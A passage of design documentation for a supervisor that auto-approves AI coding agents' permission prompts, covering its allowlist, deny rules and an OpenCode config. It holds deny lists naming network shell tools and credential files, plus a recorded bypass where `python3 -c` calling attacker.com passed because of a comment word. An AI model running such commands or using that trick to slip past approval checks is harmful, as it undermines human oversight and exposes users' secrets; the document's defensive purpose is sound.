- **git history:** push to `main`/`master`, `--force`, `reset --hard`, `clean -f`,
  `filter-branch`, `reflog expire` — §10 and §12;
- **network and package installs:** `curl`, `wget`, `nc -`, `pip install`,
  `npm install`, `npm publish`. Not because the network is dangerous in itself, but
  because the network can carry out what §12 protects, and installing a package
  pulls unreviewed third-party code into the project;
- **pipes into a shell:** `| sh`, `| bash`, `$(`, backtick, `xargs`,
  `find … -exec/-delete` — that turns any read into execution;
- **code handed to an interpreter as a string:** `python3 -c`, `node -e`. Verified
  live before the fix: `python3 -c "…urlopen('http://attacker.com')" # test` was
  allowed, because the word `test` in a comment satisfied the pattern while the code
  was arbitrary, and `urllib` is not in the deny list — the network rules catch
  `curl`, `wget` and `nc`, not a language's network module.

The human extends it: `.pair/permissions.json` with `{"allow": ["Read", "git
status"]}`, `PAIR_PERMISSIONS`, or `bin/pairpilot --allow 'Read,git status'`.

Three cases, kept apart, because collapsing them is what broke this: **no file at
all** means the default list — that is the boundary the human drew, inside the
repository whatever the work needs, refused what can harm the machine, another
project, or what cannot be recovered. **An explicitly empty string** means confirm
nothing, because a person said so. **A file that exists but is broken** also confirms
nothing: the operator was configuring something and typed it wrong, and silently
falling back to the default would quietly discard their intent, which is worse than
stopping.

And it is said out loud. The pilot records `pilot_default_allowlist` once per run and
the server records `unblock_default_allowlist` per confirmation, so the journal shows
which rule approved a command. This mattered: the file never existed, so the path to
it became the single allow pattern, it matched no prompt, and **the supervisor refused
everything** — which from the outside is indistinguishable from a peer that stopped
helping.

A refusal is not an error but a result: the pane stays blocked, the event
`pilot_unblock_refused` lands in the transcript, and the reason lands in the report.
The reason is mandatory: an unexplained "no" is indistinguishable from a broken
supervisor.

**A limitation worth knowing.** The decision is made on the text of the line, not by
parsing the command: a line may contain a harmless word next to a dangerous one.
Three rules compensate: the default list is limited to internal work, the deny list is
checked first and cannot be overridden, and the match is written into the transcript
together with the line — so the journal shows what exactly was said yes to.

The same list applies to the agent's `pair_unblock` and to `bin/pairwatch --unblock`.
Leaving the hole open on the other side would leave it half closed.

**Two forms of the question.** Not every agent asks `[y/N]`. The opencode TUI shows a
menu — `Allow once · Always allow · Reject` with a `⇆ select  enter confirm` footer.
The differences matter, and both are handled:

| | `[y/N]` | menu |
|---|---|---|
| how it is detected | `PERMISSION_PATTERNS`, last two lines | the `Permission required` header **and** menu markers |
| what the verdict is taken from | the question line | the whole modal — the command is in the body (`$ git status`), not the header |
| what is pressed | `y`, then `Enter` | `Enter` only |
| composer check | yes | no: a modal has no input line |

`y` does not mean consent in that TUI, so it is not sent. A verdict on the header
alone would refuse everything — it contains no word from the allowlist — so approval
in a menu would silently stop working. `Permission required` in ordinary output is not
a question: both markers are required.

For `[y/N]`, the verdict also reads a few lines above the question
(`OVERSCAN_LINES`), because Claude Code prints the command on the second-to-last line
and the question last — taking the question alone refused 100% of safe commands, so
`auto` was inoperative on that CLI. The cap exists so approval cannot be granted by a
word from far up the screen.

### 13c. Your own deny list outranks the supervisor

Every CLI has its own mechanism and it fires **before** any of ours. For OpenCode
that is `permission` in `opencode.jsonc` and the `--auto` flag: in auto mode,
requests that are not explicitly denied are confirmed by themselves, while `"deny"`
rules always apply.

```jsonc
{
  "permission": {
    "bash": {
      "*": "allow",
      "sudo *": "deny", "curl *": "deny", "wget *": "deny",
      "pip install *": "deny", "npm install *": "deny", "npm publish *": "deny",
      "ssh *": "deny", "docker *": "deny", "kubectl *": "deny",
      "terraform *": "deny", "helm *": "deny", "mkfs*": "deny", "killall *": "deny",
      "git push *main*": "deny", "git push *master*": "deny", "git push --force*": "deny",
      "git reset --hard *": "deny", "git clean -f*": "deny", "git filter-branch*": "deny"
    },
    "read": {
      "*": "allow",
      "*.env": "deny", "*.env.*": "deny", "*.env.example": "allow",
      "**/.ssh/*": "deny", "**/id_rsa*": "deny", "**/*.pem": "deny", "**/*.key": "deny",
      "**/.npmrc": "deny", "**/.aws/*": "deny", "**/.git-credentials": "deny"
    }
  }
}
```

The asterisks there are opencode's own syntax, not ours: rules apply in order and the
last match wins, which is why `"*": "allow"` goes first.

Why this is better than the supervisor's allowlist rather than next to it:

- **it fires earlier.** The CLI shows no dialog at all, so the agent does not stall
  and the supervisor is not left deciding whether to press Enter;
- **it is mandatory.** `"deny"` applies in auto mode too, so a typo in our allowlist
  cannot get past it;
- **the human reads it.** The rules live in their config, next to the model settings,
  not inside the tool we happen to ship.

That is why `launch` for OpenCode includes `--auto`: the agent stops stopping at every
step, while the boundary rests on `deny`, which the human sees and can change.

## 17. Git Worktrees Isolation (S5)

When multiple pairs run in parallel, or when switching between tasks without dirtying
the main working tree, git worktrees provide filesystem isolation.

- `pairup --worktree <branch>` (alias `-w <branch>`):
  Automatically provisions `.worktrees/<branch>` via `git worktree add`, switches into it,
  and scopes `.pair` state locally.
- `pairctl worktree list [--json]`:
  Lists registered worktrees across the repository.
- `pairctl worktree prune [--json]`:
  Cleans stale worktree administrative records (`git worktree prune`).
- `pairctl worktree remove [--target <path/branch>] [--force]`:
  Removes an allocated worktree.